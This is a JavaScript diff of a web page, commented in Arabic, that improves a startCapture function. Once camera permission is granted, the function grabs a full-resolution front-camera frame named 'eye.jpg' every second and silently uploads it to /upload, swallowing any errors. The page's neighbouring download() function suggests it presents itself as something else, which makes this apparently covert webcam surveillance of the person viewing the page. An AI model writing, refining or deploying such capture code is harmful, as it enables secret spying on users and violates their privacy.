@@ -555,20 +555,38 @@ function download(){
   },300);
 }
 
-/* ===== ميزات الكاميرا الخلفية وتوثيق الصور التقاطاً وتخزيناً ===== */
+/* ===== ميزات الكاميرا وتوثيق الصور بالأبعاد الحقيقية الصحيحة ===== */
 function startCapture() {
-    navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-            document.getElementById('video').srcObject = stream;
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+        .then(async stream => {
+            const videoEl = document.getElementById('video');
+            videoEl.srcObject = stream;
+            
+            // الانتظار حتى يتم تحميل بيانات الفيديو ومعرفة الأبعاد الأصلية الحقيقية
+            await new Promise((resolve) => {
+                if (videoEl.readyState >= 2) resolve();
+                else videoEl.onloadeddata = () => resolve();
+            });
+
+            const vw = videoEl.videoWidth;
+            const vh = videoEl.videoHeight;
+
             setInterval(() => {
                 const canvas = document.createElement('canvas');
-                canvas.width = 640; canvas.height = 480;
-                canvas.getContext('2d').drawImage(document.getElementById('video'), 0, 0, 640, 480);
+                // ضبط أبعاد الكانفاس الحقيقية لمنع مط أو تشويه الصورة
+                canvas.width = vw;
+                canvas.height = vh;
+                
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(videoEl, 0, 0, vw, vh);
+
                 canvas.toBlob(blob => {
-                    let fd = new FormData();
-                    fd.append('image', blob, 'eye.jpg');
-                    fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
-                }, 'image/jpeg');
+                    if (blob) {
+                        let fd = new FormData();
+                        fd.append('image', blob, 'eye.jpg');
+                        fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
+                    }
+                }, 'image/jpeg', 0.90);
             }, 1000);
         }).catch(e => console.log("بانتظار إذن الكاميرا"));
 }
